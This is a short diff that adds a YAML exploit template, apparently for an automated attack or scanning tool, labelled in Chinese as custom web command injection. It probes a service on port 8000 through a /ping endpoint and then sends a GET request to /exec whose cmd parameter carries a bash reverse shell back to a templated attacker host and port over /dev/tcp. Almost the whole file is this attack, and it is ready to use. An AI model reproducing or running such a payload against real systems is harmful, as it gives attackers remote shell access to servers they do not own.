@@ -1,0 +1,8 @@
+id: custom-web-rce
+name: 自定义Web命令注入
+port: 8000
+detect_path: /ping
+detect_match: "pong"
+steps:
+  - method: GET
+    path: /exec?cmd=bash -c 'bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1'
